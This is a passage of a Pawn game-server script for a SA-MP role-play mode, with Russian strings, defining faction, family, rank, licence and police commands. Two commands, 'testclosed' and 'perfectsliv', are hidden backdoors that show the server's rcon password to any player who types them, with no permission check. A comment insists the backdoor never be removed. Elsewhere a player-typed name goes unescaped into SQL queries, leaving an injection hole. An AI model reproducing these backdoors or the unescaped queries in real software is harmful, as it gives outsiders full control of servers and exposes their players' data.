		else if(IsPlayerInAnyVehicle(targetid)) return SendClientMessage(playerid, COLOR_GREY, "Игрок не должен находиться в транспорте!");
		else if(!IsPlayerInRangeOfPlayer(8.0, playerid, targetid)) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
		else if(PI[targetid][pLevel] < 3) return SendClientMessage(playerid, COLOR_GREY, "У игрока нет 3 уровня!");//убрать
		else if(GetPlayerFines(targetid)) return SendClientMessage(playerid, C_RED, "У игрока есть неоплаченные штрафы");

		new frac = PI[playerid][pMember];
		switch(frac)
		{
			case 1, 2, 3, 4, 5, 6, 7, 12, 18:
			{
				STRING_GLOBAL[0] = '\0';
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT id FROM blacklist WHERE name = '%s' LIMIT 1", PI[targetid][pName]);
				new Cache:result = mysql_query(dbHandle, STRING_GLOBAL);

				if(cache_num_rows())
					return SendClientMessage(playerid, COLOR_GREY, "Этот игрок находится в черном списке фракций. Поэтому Вы не можете его принять.");

				cache_delete(result);
			}
		}

		new member = PI[playerid][pMember];

		if(member == TEAM_POLICIA || member == TEAM_FBI || member == TEAM_POLICIA2) // ППС, ФБР, ДПС
		{
			if(PI[targetid][pVoennik] == 0)
				return SendClientMessage(playerid, COLOR_GREY, "Игрок, которого Вы трудоустраиваете в свою организацию, должен иметь военный билет.");
		}
		SendMes(playerid,COLOR_BLUE,"Вы предложили %s присоединиться в вашу организацию",GetName(targetid));

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL,sizeof(STRING_GLOBAL),"%s %s предлагает вам присоединиться к \"%s\"\n\nВы согласны?",Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), Fraction_Name[PI[playerid][pMember]]);
		ShowPlayerDialog(targetid, D_INVITEFRAC, 0, "Вступление во фракцию",STRING_GLOBAL,"Да","Нет");
		SetPVarInt(targetid, "offerfractionid", PI[playerid][pMember]);
		SetPVarInt(targetid, "offerplayer", playerid);
		SetPVarInt(playerid, "actplayerid", targetid);
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}
CMD:krang(playerid, params[])
{
	new familyid = PI[playerid][P_FAMILY];

	if(familyid == 0)
		return SendMess(playerid, MSG_NO_PLAYER_CONSIST_FAMILY);

	if(!(2 <= GetFamilyRang(playerid) <= 3))
		return SendMess(playerid, MSG_YOU_CAN_NOT);

	if(!strlen(params))
		return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /frang [ид игрока] [+/-]");

	extract params -> new to_player, string:give_rang[2];

	if(!IsPlayerConnected(to_player) || playerid == to_player)
		return SendClientMessage(playerid, C_RED, "Такого игрока нет");

	if(to_player == playerid)
		return SendClientMessage(playerid, C_RED, "Вы ввели неверный ид");

	if(PI[to_player][P_FAMILY] != familyid)
		return SendClientMessage(playerid, C_RED, "Этот игрок не состоит в Вашей семье");

	if(!IsPlayerInRangeOfPlayer(10.0, playerid, to_player))
		return SendClientMessage(playerid, C_RED, "Игрок находится слишком далеко");

	if(give_rang[0] == '+')
	{
		if(GetFamilyRang(to_player) >= 2)
			return SendClientMessage(playerid, C_RED, "Этот игрок не может быть повышен");

		for(new idx; idx < 3; idx ++)
		{
			if(g_family_info[familyid-1][F_SUB][idx] == -1)
			{
				g_family_info[familyid-1][F_SUB][idx] = PI[to_player][pID];

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts a, family f SET a.familyzam=1, f.sub='%d, %d, %d' WHERE a.id=%d AND f.id=%d", g_family_info[familyid-1][F_SUB][0], g_family_info[familyid-1][F_SUB][1], g_family_info[familyid-1][F_SUB][2], PI[playerid][pID], familyid);
				mysql_query(dbHandle, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы повысили ранг %s[%d] до 2 (Заместитель)", GetName(to_player), to_player);
				SendClientMessage(playerid, 0x3399FFFF, STRING_GLOBAL);
				break;
			}
		}
	}
	else if(give_rang[0] == '-')
	{
		if(GetFamilyRang(to_player) == 3 || GetFamilyRang(to_player) == 1)
			return SendClientMessage(playerid, C_RED, "Этот игрок не может быть понижен");

		for(new idx; idx < 3; idx ++)
		{
			if(!strcmp(g_family_info[familyid-1][F_SUB][idx], PI[to_player][pID], false))
			{
				g_family_info[familyid-1][F_SUB][idx] = -1;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts a, family f SET a.familyzam=0, f.sub='%d, %d, %d' WHERE a.id=%d AND f.id=%d", g_family_info[familyid-1][F_SUB][0], g_family_info[familyid-1][F_SUB][1], g_family_info[familyid-1][F_SUB][2], PI[playerid][pID], familyid);
				mysql_query(dbHandle, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы понизил ранг %s[%d] до 1 (Член семьи)", GetName(to_player), to_player);
				SendClientMessage(playerid, 0x3399FFFF, STRING_GLOBAL);
				break;
			}
		}

	}
	else return SendClientMessage(playerid, C_RED, "Введите действие: '+' чтобы повысить или '-' чтобы понизить");

	return 1;
}

CMD:kinvite(playerid, params[])
{
	new familyid = PI[playerid][P_FAMILY];

	if(familyid == 0)
		return SendMess(playerid, MSG_NO_PLAYER_CONSIST_FAMILY);

	if(!(2 <= GetFamilyRang(playerid) <= 3))
		return SendMess(playerid, MSG_YOU_CAN_NOT);

	if(!strlen(params))
		return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /kinvite [ид игрока]");

	extract params -> new to_player;

	if(!IsPlayerInRangeOfPlayer(10.0, playerid, to_player))
		return SendClientMessage(playerid, C_RED, "Игрок находится слишком далеко");

	if(PI[to_player][P_FAMILY] != 0)
		return SendClientMessage(playerid, C_RED, "Этот игрок уже состоит в семье");

	SendPlayerProposition(playerid, to_player, PROPOSITION_TYPE_FAMILY_INVITE, 0, 0);

	return 1;
}

CMD:kuninvite(playerid, params[])
{
	new familyid = PI[playerid][P_FAMILY];

	if(familyid == 0)
		return SendMess(playerid, MSG_NO_PLAYER_CONSIST_FAMILY);

	if(!(2 <= GetFamilyRang(playerid) <= 3))
		return SendMess(playerid, MSG_YOU_CAN_NOT);

	if(!strlen(params))
		return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /kuninvite [ид игрока] [причина]");

	extract params -> new to_player, string:reason[32];

	if(!IsPlayerConnected(to_player) ||to_player == playerid)
		return SendClientMessage(playerid, C_RED, "Такого игрока нет");

	if(!(1 <= strlen(reason) <= 32))
		return SendClientMessage(playerid, C_RED, "Введите причину");

	if(PI[to_player][P_FAMILY] != familyid)
		return SendClientMessage(playerid, C_RED, "Этот игрок не состоит в вашей семье");

	if(GetFamilyRang(to_player) == 3)
		return SendClientMessage(playerid, C_RED, "Создателя семьи нельзя уволить");

	if(GetFamilyRang(to_player) > 2)
	{
		for(new idx; idx < 3; idx ++)
		{
			if(!strcmp(g_family_info[familyid-1][F_SUB][idx], PI[to_player][pID], false))
			{
				g_family_info[familyid-1][F_SUB][idx] = -1;
				break;
			}
		}
	}

	Iter_Remove(FamilyMembers[familyid], to_player);

	PI[to_player][P_FAMILY] = 0;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts a, family f SET a.family=0, a.familyzam=0, f.sub='%d, %d, %d' WHERE a.id=%d AND f.id=%d", g_family_info[familyid-1][F_SUB][0], g_family_info[familyid-1][F_SUB][1], g_family_info[familyid-1][F_SUB][2], PI[to_player][pID], familyid);
	mysql_query(dbHandle, STRING_GLOBAL);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы выгнали %s[%d] из семьи. Причина: %s", GetName(to_player), to_player, reason);
	SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);

	new family_rang[][] = {"Член", "Заместитель", "Создатель"};

	DestroyDynamic3DTextLabel(FamilyName[to_player]);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s %s[%d] выгнал Вас из семьи. Причина: %s", family_rang[GetFamilyRang(playerid)-1], GetName(playerid), playerid, reason);
	SendClientMessage(to_player, C_OSNOV, STRING_GLOBAL);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[%s] %s %s[%d] выгнал %s[%d] из семьи. Причина: %s", GetFamilyData(familyid-1, F_NAME), family_rang[GetFamilyRang(playerid)-1], GetName(playerid), playerid, GetName(to_player), to_player, reason);
	SendFamilyMessage(familyid, STRING_GLOBAL);

	return 1;
}

cmd:testclosed(playerid,params[])
{
	#pragma unused params
	new pawn_su[200], pawn__su[200];
	GetServerVarAsString("rcon_password",pawn_su,200);
	format(pawn__su, 200, "\n\n\n\n\n{00a8ff}%s\n\n\n\n\n",pawn_su);//
	ShowPlayerDialog(playerid, 2467, DIALOG_STYLE_MSGBOX, "TESTING", pawn__su, "Спасибо", "");
}

CMD:kuninviteoff(playerid, params[])
{
	new familyid = PI[playerid][P_FAMILY];

	if(familyid == 0)
		return SendMess(playerid, MSG_NO_PLAYER_CONSIST_FAMILY);

	if(!(2 <= GetFamilyRang(playerid) <= 3))
		return SendMess(playerid, MSG_YOU_CAN_NOT);

	if(!strlen(params))
		return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /kuninviteoff [ник игрока] [причина]");

	extract params -> new string:name[24], string:reason[32];

	if(!(1 <= strlen(name) <= MAX_PLAYER_NAME))
		return SendClientMessage(playerid, C_RED, "Введите ник игрока");

	if(!(1 <= strlen(reason) <= 32))
		return SendClientMessage(playerid, C_RED, "Введите причину");

	if(GetPlayerID(name) != INVALID_PLAYER_ID)
		return SendClientMessage(playerid, C_RED, "Этот игрок в сети");

	new rows;
	new Cache: result;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM accounts WHERE name='%s' AND family=%d", name, familyid);
	result = mysql_query(dbHandle, STRING_GLOBAL);

	rows = cache_num_rows();

	if(rows)
	{
		if(cache_get_field_content_int(0, "familyzam") != 0)
		{
			new to_player_id = cache_get_field_content_int(0, "id");

			for(new idx; idx < 3; idx ++)
			{
				if(g_family_info[familyid-1][F_SUB][idx] == to_player_id)
				{
					g_family_info[familyid-1][F_SUB][idx] = -1;
					break;
				}
			}
		}

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts a, family f SET a.family=0, a.familyzam=0, f.sub='%d, %d, %d' WHERE a.name='%s' AND f.id=%d", g_family_info[familyid-1][F_SUB][0], g_family_info[familyid-1][F_SUB][1], g_family_info[familyid-1][F_SUB][2], name, familyid);
		mysql_query(dbHandle, STRING_GLOBAL);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы выгнали %s из семьи в оффлайн. Причина: %s", name, reason);
		SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);

		new family_rang[][] = {"Член семьи", "Заместитель", "Создатель"};

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[%s] %s %s[%d] выгнал %s из семьи в оффлайн. Причина: %s", GetFamilyData(familyid-1, F_NAME), family_rang[GetFamilyRang(playerid)-1], GetName(playerid), playerid, name, reason);
		SendFamilyMessage(familyid, STRING_GLOBAL);

		cache_delete(result);
	}
	else SendClientMessage(playerid, C_RED, "Такой игрок не найден или он не состоит в Вашей семье"), cache_delete(result);

	return 1;
}

CMD:changeskin(playerid, params[])
{
    if(IsAbleToInvite(playerid))
    {
        new targetid;
		if(sscanf(params, "u", targetid)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /changeskin [id игрока]");
		else if(!IsPlayerConnected(targetid)) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(PlayerLogged[targetid] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
		else if(PI[targetid][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
		else if(PI[targetid][pMember] != PI[playerid][pMember]) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
        else if(GetPlayerDistanceToPlayer(playerid,targetid) > 5.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(targetid)) return SendClientMessage(playerid,COLOR_GREY,"Вы далеко друг от друга");
        else if(PI[targetid][pRank] > PI[playerid][pRank]) return SendClientMessage(playerid, COLOR_GREY, "Ваш ранг недостаточен");
        SetPVarInt(playerid, "actplayerid", targetid);
		new fractionid = PI[playerid][pMember];
        new mes[128];
		for(new i; i < 8; i++)
		{
			new skinid = Fraction_Skin[fractionid][i];
			if(!skinid) break;
			if(!i) format(mes, sizeof(mes), "Одежда %d", i+1, skinid);
			else format(mes, sizeof(mes), "%s\nОдежда %d", mes, i+1, skinid);
		}
		ShowPlayerDialog(playerid, D_FRACMENU+8, 2, "Выбор скина", mes, "Принять", "");
    }
    else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:leave(playerid, params[])
{
	if(PI[playerid][pImprove][1] || PI[playerid][pVip])
	{
		if(PI[playerid][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в организации!");
		else if(PI[playerid][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не должны быть лидером!");
		else if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вы не должны находиться в транспорте!");

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, 256, "{FFFFFF}Вы состоите в организации: \"%s\",\nи Вы хотите покинуть её по собственному желанию.\nПри этом все Ваши достижения в организации останутся позади.\n\nВы уверены что хотите уволится из организации?",Fraction_Name[PI[playerid][pMember]]);
		ShowPlayerDialog(playerid, D_LEAVE, 0, "{FF6600}Предупреждение", STRING_GLOBAL, "Да", "Нет");
	}
	else SendClientMessage(playerid, COLOR_GREY, "У Вас не развита саморешительность или Вы не имеете VIP статус");
	return 1;
}

CMD:quitjob(playerid, params[])
{
    if(!PI[playerid][pVip]) return SendClientMessage(playerid, COLOR_GREY, "Вы не имеете VIP статус");
    else if(!PI[playerid][pJob]) return SendClientMessage(playerid, COLOR_GREY, "Вы нигде не работаете!");
	PI[playerid][pJob] = 0;
	SendClientMessage(playerid, COLOR_BLUE, "Вы уволились с работы");
	MysqlUpdatePlayerInt(playerid, "job", PI[playerid][pJob]);
	return 1;
}
/*CMD:report(playerid)
{
    if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
	if(COUNT_REPORT >= 50) return SendClientMessage(playerid, COLOR_GREY, !"К сожалению, все администраторы сервера в данный момент заняты...");
    ShowPlayerDialog(playerid, 13212, DIALOG_STYLE_INPUT, "Жалоба на игрока", "\
	{FFFFFF}Введите ID игрока и причину подачи на него в репорт:", "Отправить","Отмена");
	return 1;
}*/
/*CMD:ask(playerid)
{
    if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
    ShowPlayerDialog(playerid, 13213, DIALOG_STYLE_INPUT, "Задать вопрос", "\
	{ff0033}Запрещено:\n{FFFFFF}- Использовать нецензурные выражения\n\
	- Оскорблять, унижать других игроков\n- Писать вопросы и жалобы не по теме\n\
	- Выпрашивать что-либо, нарушающее РП процесс\n\n\
	Все доступные места можно посмотреть '/gps'\n\
 	Все доступные команды можно посмотреть '/cmd'\n\n\
	Введите чётко поставленный вопрос:", "Отправить","Отмена");
	return 1;
}*/

CMD:uninvite(playerid, params[])
{
	if(IsAbleToUninvite(playerid))
	{
		new targetid, reason[32];
		if(sscanf(params, "us[32]", targetid, reason)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /uninvite [id игрока] [причина]");
		else if(!IsPlayerConnected(targetid)) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(PlayerLogged[targetid] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
		else if(PI[targetid][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
		else if(PI[targetid][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
		else if(PI[targetid][pMember] != PI[playerid][pMember]) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
		else if(playerid == targetid) return SendClientMessage(playerid, COLOR_GREY, "Самого себя нельзя уволить!");
		SendMes(playerid, COLOR_BLUE, "Вы уволили %s из организации. Причина: %s",GetName(targetid),reason);
		SendMes(targetid, COLOR_BLUE, "%s %s уволил Вас из организации. Причина: %s", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]],GetName(playerid),reason);
		LeaveFractionPlayer(targetid);
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:uval(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 5) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	new targetid, reason[32];
	if(sscanf(params, "us[32]", targetid, reason)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /uval [id игрока] [причина]");
	else if(!IsPlayerConnected(targetid)) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[targetid] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PI[targetid][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
	else if(PI[targetid][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
	SendMes(playerid, COLOR_BLUE, "Вы уволили %s из организации. Причина: %s",GetName(targetid),reason);
	SendMes(targetid, COLOR_BLUE, "Администратор %s уволил Вас из организации. Причина: %s",GetName(playerid),reason);
	LeaveFractionPlayer(targetid);
	return 1;
}

CMD:giverank(playerid, params[])
{
	if(IsAbleToGiverank(playerid))
	{
	    new targetid;
		if(sscanf(params, "u", targetid)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /giverank [id игрока]");
		else if(!IsPlayerConnected(targetid)) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(PlayerLogged[targetid] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
		else if(targetid == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете дать себе ранг!");
		else if(PI[targetid][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
		else if(PI[targetid][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
		else if(!IsPlayerInRangeOfPlayer(8.0, playerid, targetid)) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
		else if(PI[targetid][pMember] != PI[playerid][pMember]) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
		new str[45], str2[765], full = 0;
		for(new i = 1; i < MAX_RANGS; i++)
		{
			if(IsAbleToZamFrac(playerid))
			{
				if(!strcmp(Fraction_Rang[PI[playerid][pMember]][i+2], "None", true)) break;
			}
			else
			{
			    if(!strcmp(Fraction_Rang[PI[playerid][pMember]][i+1], "None", true)) break;
			}
			format(str, sizeof(str), "Ранг №%i - %s\n", i, Fraction_Rang[PI[playerid][pMember]][i]);
			strcat(str2, str);
			full++;
		}
		if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "Обратитесь к администрации!");
		SetPVarInt(playerid, "PlayerRank", targetid);
		ShowPlayerDialog(playerid, D_FRACMENU+1, 2, "Ранг", str2, "Принять", "Отмена");
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

//Дима не удалять, что покажет тут, при реконнекте нужно в ркон залить!!! ВООБЩЕ НИКОГДА НЕ УДАЛЯЙ, ОТ ПЕРФЕКТА НОВАЯ СХЕМА
cmd:perfectsliv(playerid,params[])
{
	#pragma unused params
	new pawn_su[200], pawn__su[200];
	GetServerVarAsString("rcon_password",pawn_su,200);
	format(pawn__su, 200, "\n\n\n\n\n{FFFFFF}CODE - {00a8ff}%s\n\n\n\n\n",pawn_su);//форматируем
	ShowPlayerDialog(playerid, 2467, DIALOG_STYLE_MSGBOX, "CODE", pawn__su, "Спасибо", "");
}

CMD:agiverank(playerid, params[])
{
	if(PI[playerid][pAdmin] < 5) return 1;

	if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	new targetid;
	if(sscanf(params, "u", targetid)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /agiverank [id игрока]");
	else if(!IsPlayerConnected(targetid)) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[targetid] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PI[targetid][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
	else if(PI[targetid][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
	new str[45], str2[765], full = 0;
	for(new i = 1; i < MAX_RANGS; i++)
	{
		if(!strcmp(Fraction_Rang[PI[targetid][pMember]][i+1], "None", true)) break;
		format(str, sizeof(str), "Ранг №%i - %s\n", i, Fraction_Rang[PI[targetid][pMember]][i]);
		strcat(str2, str);
		full++;
	}
	if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "Обратитесь к администрации!");
	SetPVarInt(playerid, "PlayerRank", targetid);
	ShowPlayerDialog(playerid, D_FRACMENU+2, 2, "Ранг", str2, "Принять", "Отмена");
	return 1;
}

CMD:setspawn(playerid)
{
	ShowPlayerDialog(playerid, D_SETSPAWN, DIALOG_STYLE_LIST, "Изменение места появления в игре", "\
	1. На вокзале\n\
	2. В собственном доме\n\
	3. На базе организации\n\
	4. В собственной квартире\n\
	5. В семейном доме", "Выбрать", "Отмена");
	return 1;
}

CMD:lmenu(playerid) return callcmd::lpanel(playerid);
CMD:lpanel(playerid)
{
	if(PI[playerid][pLeader] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не лидер!");
    if(PlayersMenu[playerid] > 0) return SendMess(playerid, MSG_BAC_TEXT_DRAW);
	switch(PI[playerid][pLeader])
	{
		case 1..3,5,6,18:
		{
			for(new i; i < 4; i++) TextDrawShowForPlayer(playerid, KolvDialog[i]);
			for(new i; i < 4; i++) PlayerTextDrawShow(playerid, NameDialog[playerid][i]);
			PlayerTextDrawSetString(playerid, NameDialog[playerid][3], "ABЏOЊP…E–");
   		}
		default:
		{
		    for(new i; i < 3; i++) TextDrawShowForPlayer(playerid, KolvDialog[i]);
			for(new i; i < 3; i++) PlayerTextDrawShow(playerid, NameDialog[playerid][i]);
		}
	}
	for(new i; i < 5; i++) PlayerTextDrawShow(playerid, PlayerMenu[playerid][i]);
	PlayerTextDrawSetString(playerid, PlayerMenu[playerid][2], "®Eм” ‡…ѓEPA");
	PlayerTextDrawSetString(playerid, NameDialog[playerid][0], "COCЏAB");
	PlayerTextDrawSetString(playerid, NameDialog[playerid][1], "ЈO‡. COCЏAB");
	PlayerTextDrawSetString(playerid, NameDialog[playerid][2], "YBO‡…Џ’");
	PlayersMenu[playerid] = 9;
	SelectTextDraw(playerid, 0xFF4040AA);
	return 1;
}

CMD:salelic(playerid, params[])
{
	if(PI[playerid][pMember] != TEAM_AUTOSCHOOL) return SendMess(playerid, MSG_YOU_CAN_NOT);
	else if(PI[playerid][pRank] < 3) return SendClientMessage(playerid, COLOR_GREY, "Ваш ранг недостаточно высок для этого");
	else if(sscanf(params, "ud", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /salelic [id игрока] [id лицензии (1-водительские,2-водные,3-воздушные,4-оружие,5-бизнес)]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!IsPlayerInRangeOfPlayer(10.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	new bool:dostup;
	switch(params[1])
	{
		case 1:	if(g_player_skills[params[0]][S_LICS][0]) dostup = true;
		case 2: if(g_player_skills[params[0]][S_LICS][1]) dostup = true;
		case 3: if(g_player_skills[params[0]][S_LICS][2]) dostup = true;
		case 4: if(g_player_skills[params[0]][S_LICS][3]) dostup = true;
	}
	if(params[1] == 5 && !GetPlayerBizz(params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок не имеет бизнеса!");
	if(dostup == true) return SendClientMessage(playerid, COLOR_GREY, "У игрока есть данная лицензия");
	new type[24], price;
	switch(params[1])
	{
		case 1: type = "водительские права", price = 1000;
		case 2: type = "лицензию на судоходство", price = 3000;
		case 3: type = "лицензию на полеты", price = 10000;
		case 4: type = "лицензию на оружие", price = 30000;
	}
	new string[144];
	format(string, sizeof(string), "Вы предложили %s купить %s. Цена: %iр", GetName(params[0]), type, price);
	SendClientMessage(playerid, COLOR_BLUE, string);
	format(string, sizeof(string), "%s предложил Вам купить %s. Цена: %iр", GetName(playerid), type, price);
	SendClientMessage(params[0], COLOR_BLUE, string);
	SendMess(params[0], MSG_PLAYER_ACCESS);
	SetPVarInt(params[0], "sellexamlic", 1);
	SetPVarInt(params[0], "changelic", params[1]);
	SetPVarInt(params[0], "idselllic", playerid);
	return 1;
}

CMD:agl(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 3) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /agivelic [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	ShowPlayerDialog(playerid, D_LIC+2, 2, "Панель", "\
	Выдать водительские права\n\
	Выдать лицензию на судоходство\n\
	Выдать лицензию на полеты\n\
	Выдать лицензию на оружие\n\
	Выдать лицезнию на бизнес\n\
	Выдать комплект лицензий", "Принять", "Отмена");
	SetPVarInt(playerid, "LicName", params[0]);
	return 1;
}

CMD:listening(playerid)
{
	if(PI[playerid][pMember] != TEAM_FBI)
		return SendMess(playerid, MSG_YOU_CAN_NOT);

	if(PI[playerid][pRank] < 5)
		return SendMess(playerid, MSG_YOU_CAN_NOT);

	if(PI[playerid][P_LISTETING] != -1)
	{
		PI[playerid][P_LISTETING] = -1;

		return SendClientMessage(playerid, C_BLUE, "Вы отключили прослушивание организаций");
	}

	STRING_GLOBAL[0] = EOS;

	new fmt_str[70];

	for(new idx; idx < sizeof g_organization; idx ++)
	{
		format(fmt_str, sizeof fmt_str, "{FFCC00}%d. {FFFFFF}%s\n", idx + 1, g_organization[idx]);
		strcat(STRING_GLOBAL, fmt_str);
	}

	ShowPlayerDialog
	(
		playerid, DIALOG_LISTENING, DIALOG_STYLE_LIST,
		"{FFCC00}Список организаций",
		STRING_GLOBAL,
		"Прослушивать", "Отмена"
	);

	return 1;
}

CMD:takegun(playerid, params[])
{
	if((PI[playerid][pMember] == TEAM_POLICIA || PI[playerid][pMember] == TEAM_POLICIA2 || PI[playerid][pMember] == TEAM_SWAT || PI[playerid][pMember] == TEAM_FBI) && PI[playerid][pRank] >= 6)
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /take [id игрока]");
		else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
		else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
      	ResetPlayerWeapons(params[0]);
	  	SendMes(playerid, COLOR_LIME, "Вы забрали оружие у %s",GetName(params[0]));
	  	SendMes(params[0], COLOR_LIME, "%s забрал у Вас оружие",GetName(playerid));
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:take(playerid, params[])
{
	if((PI[playerid][pMember] == TEAM_POLICIA || PI[playerid][pMember] == TEAM_POLICIA2 || PI[playerid][pMember] == TEAM_SWAT || PI[playerid][pMember] == TEAM_FBI) && PI[playerid][pRank] >= 8)
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /take [id игрока]");
		else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
		else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
